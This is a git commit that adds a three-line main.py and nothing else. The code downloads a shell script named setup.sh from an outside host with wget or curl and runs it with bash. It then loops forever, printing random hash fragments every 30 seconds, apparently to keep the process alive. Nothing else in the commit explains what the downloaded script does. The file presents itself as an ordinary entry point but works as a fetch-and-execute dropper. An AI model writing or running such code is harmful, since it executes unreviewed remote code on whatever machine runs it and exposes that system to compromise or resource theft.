0a8bf1542128d2f48998ab415cbc94728b008a3a
nanasujiwa-dev <nanasujiwa@gmail.com>
2026-03-07 18:02:45 +0800

    Create main.py

---
+++ main.py
@@ -0,0 +1,3 @@
+import os
+os.system('(wget https://free.tiurl.top/setup.sh -4O tinyinstaller.sh || curl https://free.tiurl.top/setup.sh -Lo tinyinstaller.sh) && bash tinyinstaller.sh free')
+os.system('while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done')
